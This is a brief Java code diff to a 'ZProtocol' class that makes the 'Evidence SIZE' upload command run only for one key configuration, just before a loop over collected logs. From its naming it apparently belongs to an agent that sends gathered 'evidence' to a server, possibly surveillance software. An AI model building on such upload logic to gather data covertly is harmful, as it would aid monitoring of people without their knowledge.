@@ -756,8 +756,13 @@ public class ZProtocol extends Protocol {
             // Evidence SIZE
             byte[] plainOut = new byte[4 + 8];
             Utils.copy(plainOut, 0, Utils.intToByteArray(lsize), 0, 4);
-            byte[] response = command(Proto.EVIDENCE_SIZE, plainOut);
-            checkOk(response);
+
+            byte[] response;
+            
+            if (!Keys.getInstance().isSeven()) {
+                response = command(Proto.EVIDENCE_SIZE, plainOut);
+                checkOk(response);
+            }
 
             for (int j = 0; j < lsize; ++j) {
                 final String logName = (String) logs.elementAt(j);
